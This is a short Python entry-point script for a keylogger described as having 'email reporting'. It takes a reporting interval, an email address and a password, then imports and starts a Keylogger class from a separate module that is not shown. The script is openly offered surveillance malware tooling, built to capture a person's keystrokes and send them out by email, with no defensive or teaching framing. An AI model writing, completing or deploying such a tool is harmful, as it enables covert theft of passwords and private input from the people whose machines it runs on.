#!/usr/bin/python

import Keylogger
import argparse

def main():
    parser = argparse.ArgumentParser ( description="Keylogger with email reporting" )
    parser.add_argument ( "-t", "--time_interval", type=int, default=30, help="Time interval in seconds" )
    parser.add_argument ( "-e", "--email", default="your_email@gmail.com", required=True, help="Your email address" )
    parser.add_argument ( "-p", "--password",default="your_password", required=True, help="Your email password" )

    args = parser.parse_args ()

    my_keylogger = Keylogger.Keylogger( args.time_interval, args.email, args.password )
    my_keylogger.start ()


if __name__ == "__main__":
    main ()
